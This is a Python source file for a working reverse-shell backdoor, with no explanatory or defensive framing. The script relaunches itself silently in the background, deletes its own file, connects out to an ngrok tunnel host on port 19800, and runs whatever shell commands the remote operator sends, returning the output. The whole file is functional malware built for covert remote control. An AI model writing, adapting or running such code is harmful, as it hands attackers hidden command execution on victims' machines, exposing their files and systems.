import os
import sys
import socket
import threading
import subprocess

from io import StringIO


if len(sys.argv) == 1:
    os.system(f"python3 "+__file__+" exploit &>/dev/null &")
    exit()
else:
    os.system(f"rm "+__file__)
HEADER = 64
PORT = 19800
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "0.tcp.ngrok.io"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


class Capturing(list):
    def __enter__(self):
        self._stdout = sys.stdout
        sys.stdout = self._stringio = StringIO()
        return self
    def __exit__(self, *args):
        self.extend(self._stringio.getvalue().splitlines())
        del self._stringio    # free up some memory
        sys.stdout = self._stdout

def send(msg):
    try:
        message = msg.encode(FORMAT)
    except:
        message = msg
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

def cd(path):
    with Capturing() as output:
        try:
            os.chdir(path)
        except FileNotFoundError as e:
            print(e)
        except NotADirectoryError as e:
            print(e)
    if '\n'.join(output).strip():
        send('\n'.join(output))
    else:
        send('')

def handle_recv(conn):
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECT_MESSAGE:
                connected = False
                break
            if msg.startswith('cd'):
                cd(msg.replace('cd ',''))
            else:
                shell = subprocess.run(msg,shell=True,stdout=subprocess.PIPE).stdout
                if shell.strip():
                    send(shell.strip())
                else:
                    send('')

def start():
    thread = threading.Thread(target=handle_recv, args=(client,))
    thread.start()

start()